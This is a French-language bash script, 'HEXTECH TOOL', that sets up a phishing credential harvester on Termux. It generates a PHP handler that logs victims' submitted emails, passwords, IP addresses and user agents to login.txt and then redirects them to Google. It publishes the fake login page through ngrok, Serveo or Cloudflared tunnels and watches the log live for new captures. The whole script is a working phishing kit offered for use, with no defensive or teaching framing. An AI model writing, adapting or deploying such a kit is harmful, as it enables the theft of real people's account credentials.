#!/bin/bash

# ============================================
# HEXTECH TOOL - Version Termux & Render
# Compatible avec vos fichiers existants
# ============================================

# Couleurs adaptées Termux
BLEU='\033[1;34m'
JAUNE='\033[1;33m'
ROUGE='\033[1;31m'
VERT='\033[1;32m'
CYAN='\033[1;36m'
MAGENTA='\033[1;35m'
NC='\033[0m'

# Animation ASCII
animation() {
    clear
    echo -e "${MAGENTA}"
    echo -e " ██╗  ██╗███████╗██╗  ██╗████████╗███████╗ ██████╗██╗  ██╗"
    echo -e " ██║  ██║██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔════╝██║  ██║"
    echo -e " ███████║█████╗   ╚███╔╝    ██║   █████╗  ██║     ███████║"
    echo -e " ██╔══██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██║     ██╔══██║"
    echo -e " ██║  ██║███████╗██╔╝ ██╗   ██║   ███████╗╚██████╗██║  ██║"
    echo -e " ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝"
    echo -e "${NC}"
    echo -e "${CYAN}==================================================${NC}"
    echo -e "${VERT}          🇨🇩 HEXTECH TOOL PRO 🇨🇩         ${NC}"
    echo -e "${CYAN}==================================================${NC}"
    echo -e "${JAUNE}           🔥 POWERED BY HEXTECH 🔥${NC}"
    echo -e "${CYAN}==================================================${NC}"
    sleep 1
}

# Afficher les données collectées
afficher_donnees() {
    echo -e "\n${CYAN}═════════ CONNEXION DÉTECTÉE ═════════${NC}"
    
    if [ -f login.txt ] && [ -s login.txt ]; then
        while IFS= read -r ligne || [[ -n "$ligne" ]]; do
            ligne_clean=$(echo "$ligne" | tr -d '\r')
            case "$ligne_clean" in
                *Email:*|*email:*)
                    echo -e "${VERT}✉️ Email: ${NC}${ligne_clean#*: }"
                    ;;
                *Password:*|*password:*)
                    echo -e "${VERT}🔑 Mot de passe: ${NC}${ligne_clean#*: }"
                    ;;
                *IP:*)
                    echo -e "${CYAN}🌍 IP: ${NC}${ligne_clean#*: }"
                    ;;
                *Date:*)
                    echo -e "${CYAN}📅 Date: ${NC}${ligne_clean#*: }"
                    ;;
            esac
        done < login.txt
    else
        echo -e "${JAUNE}Aucune donnée pour le moment${NC}"
    fi
    
    echo -e "${CYAN}══════════════════════════════════════${NC}"
    echo -e "${ROUGE}💻 cat login.txt pour voir tous les détails${NC}\n"
}

# Surveillance en temps réel
surveiller_donnees() {
    echo -e "${VERT}[•] Surveillance des connexions...${NC}"
    echo -e "${JAUNE}Appuyez sur ${ROUGE}Ctrl+C${JAUNE} pour arrêter${NC}"

    if [ ! -f login.txt ]; then
        touch login.txt
        chmod 644 login.txt
    fi

    if [ -s login.txt ]; then
        echo -e "${JAUNE}📊 Données existantes :${NC}"
        afficher_donnees
    fi

    tail -n 0 -f login.txt 2>/dev/null | while read -r ligne; do
        if [[ "$ligne" == *"Email:"* || "$ligne" == *"Password:"* ]]; then
            clear
            animation
            echo -e "${VERT}[✓] NOUVELLE CONNEXION !${NC}"
            afficher_donnees
        fi
    done
}

# Vérifier/créer login.php
verifier_login_php() {
    if [ ! -f login.php ]; then
        echo -e "${JAUNE}[•] Création de login.php...${NC}"
        cat > login.php << 'EOL'
<?php
$logFile = __DIR__ . '/login.txt';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];
    $date = date('Y-m-d H:i:s');
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

    if (empty($email) || empty($password)) {
        die(json_encode(['error' => 'Champs requis']));
    }

    $logEntry = "\n=============================================\n";
    $logEntry .= "Date: $date\n";
    $logEntry .= "Email: " . htmlspecialchars($email) . "\n";
    $logEntry .= "Password: " . htmlspecialchars($password) . "\n";
    $logEntry .= "IP: $ip\n";
    $logEntry .= "User Agent: $userAgent\n";
    $logEntry .= "=============================================\n";

    file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
    
    // Redirection vers mer.html ou Google
    if (file_exists('mer.html')) {
        header("Location: mer.html");
    } else {
        header("Location: https://www.google.com");
    }
    exit();
} else {
    header("HTTP/1.1 403 Forbidden");
    die("Accès non autorisé");
}
EOL
        echo -e "${VERT}[✓] login.php créé${NC}"
    else
        echo -e "${VERT}[✓] login.php existe déjà${NC}"
    fi
}

# Vérifier mer.html
verifier_mer_html() {
    if [ ! -f mer.html ]; then
        echo -e "${JAUNE}[•] Création de mer.html...${NC}"
        cat > mer.html << 'EOL'
<!DOCTYPE html>
<html>
<head>
    <title>Redirection</title>
    <meta http-equiv="refresh" content="2;url=https://www.google.com">
</head>
<body>
    <h2>Connexion réussie !</h2>
    <p>Redirection en cours...</p>
</body>
</html>
EOL
        echo -e "${VERT}[✓] mer.html créé${NC}"
    fi
}

# Démarrer le serveur
demarrer_serveur() {
    echo -e "${BLEU}[•] Démarrage du serveur PHP...${NC}"
    
    verifier_login_php
    verifier_mer_html
    
    touch login.txt
    chmod 644 login.txt
    
    # Tuer les anciens processus PHP sur le port 8080
    pkill -f "php -S.*8080" 2>/dev/null
    
    php -S 0.0.0.0:8080 > /dev/null 2>&1 &
    PHP_PID=$!
    
    sleep 2
    
    if kill -0 $PHP_PID 2>/dev/null; then
        echo -e "${VERT}[✓] Serveur PHP actif sur le port 8080${NC}"
    else
        echo -e "${ROUGE}[!] Erreur démarrage serveur${NC}"
        exit 1
    fi
    
    # Afficher les URLs
    echo -e "${CYAN}==================================================${NC}"
    echo -e "${VERT}🌐 Accès local : http://localhost:8080/login.html${NC}"
    
    # IP locale pour Termux
    IP_LOCALE=$(ip addr show 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v 127.0.0.1 | head -1)
    if [ -n "$IP_LOCALE" ]; then
        echo -e "${VERT}📱 Sur le réseau : http://$IP_LOCALE:8080/login.html${NC}"
    fi
    
    echo -e "${CYAN}==================================================${NC}"
    
    surveiller_donnees
}

# Tunnel Ngrok
installer_ngrok() {
    echo -e "${JAUNE}[•] Installation Ngrok...${NC}"
    
    # Détection architecture
    ARCH=$(uname -m)
    case $ARCH in
        aarch64) NGROK_URL="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip" ;;
        armv7l)  NGROK_URL="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip" ;;
        *)       NGROK_URL="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip" ;;
    esac
    
    wget -q -O ngrok.zip "$NGROK_URL"
    unzip -q ngrok.zip
    chmod +x ngrok
    mv ngrok ~/bin/ 2>/dev/null || mv ngrok /data/data/com.termux/files/usr/bin/
    rm ngrok.zip
    echo -e "${VERT}[✓] Ngrok installé${NC}"
}

generer_lien_ngrok() {
    if ! command -v ngrok &> /dev/null; then
        mkdir -p ~/bin
        installer_ngrok
    fi
    
    echo -e "${JAUNE}[•] Lancement de Ngrok...${NC}"
    echo -e "${CYAN}==================================================${NC}"
    ngrok http 8080
}

# Tunnel Serveo
generer_lien_serveo() {
    echo -e "${JAUNE}[•] Connexion à Serveo...${NC}"
    echo -e "${CYAN}==================================================${NC}"
    ssh -R 80:localhost:8080 serveo.net
}

# Tunnel Cloudflared
installer_cloudflared() {
    echo -e "${JAUNE}[•] Installation Cloudflared...${NC}"
    pkg install cloudflared -y 2>/dev/null || {
        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
        chmod +x cloudflared
        mv cloudflared ~/bin/
    }
    echo -e "${VERT}[✓] Cloudflared installé${NC}"
}

generer_lien_cloudflared() {
    if ! command -v cloudflared &> /dev/null; then
        installer_cloudflared
    fi
    echo -e "${JAUNE}[•] Démarrage Cloudflared...${NC}"
    echo -e "${CYAN}==================================================${NC}"
    cloudflared tunnel --url http://localhost:8080
}

# Vérifier les dépendances Termux
verifier_dependances() {
    echo -e "${CYAN}[•] Vérification des dépendances...${NC}"
    
    if ! command -v php &> /dev/null; then
        echo -e "${JAUNE}[!] Installation PHP...${NC}"
        pkg install php -y
    fi
    
    if ! command -v ssh &> /dev/null; then
        echo -e "${JAUNE}[!] Installation OpenSSH...${NC}"
        pkg install openssh -y
    fi
    
    if ! command -v unzip &> /dev/null; then
        echo -e "${JAUNE}[!] Installation Unzip...${NC}"
        pkg install unzip -y
    fi
    
    echo -e "${VERT}[✓] Toutes les dépendances sont prêtes${NC}"
}

# Menu principal
menu_principal() {
    while true; do
        animation
        echo -e "${VERT}1. ${BLEU}Lancer le serveur${NC}"
        echo -e "${VERT}2. ${JAUNE}Exposer avec Ngrok${NC}"
        echo -e "${VERT}3. ${CYAN}Exposer avec Serveo${NC}"
        echo -e "${VERT}4. ${MAGENTA}Exposer avec Cloudflared${NC}"
        echo -e "${VERT}5. ${ROUGE}Voir les logs${NC}"
        echo -e "${VERT}6. ${ROUGE}Effacer les logs${NC}"
        echo -e "${VERT}7. ${ROUGE}Quitter${NC}"
        echo -e "${CYAN}==================================================${NC}"
        read -p "Choix (1-7) : " choix

        case $choix in
            1)
                verifier_dependances
                demarrer_serveur
                ;;
            2)
                verifier_dependances
                demarrer_serveur &
                sleep 3
                generer_lien_ngrok
                ;;
            3)
                verifier_dependances
                demarrer_serveur &
                sleep 3
                generer_lien_serveo
                ;;
            4)
                verifier_dependances
                demarrer_serveur &
                sleep 3
                generer_lien_cloudflared
                ;;
            5)
                if [ -f login.txt ] && [ -s login.txt ]; then
                    cat login.txt
                else
                    echo -e "${JAUNE}Aucun log disponible${NC}"
                fi
                echo ""
                read -p "Appuyez sur Entrée pour continuer..."
                ;;
            6)
                > login.txt
                echo -e "${VERT}[✓] Logs effacés${NC}"
                sleep 1
                ;;
            7)
                echo -e "${ROUGE}Au revoir !${NC}"
                pkill -f "php -S" 2>/dev/null
                exit 0
                ;;
            *)
                echo -e "${ROUGE}Choix invalide${NC}"
                sleep 1
                ;;
        esac
    done
}

# Vérification Termux
if [ -d "/data/data/com.termux" ]; then
    echo -e "${VERT}✅ Mode Termux détecté${NC}"
    sleep 1
fi

# Lancer le menu
menu_principal
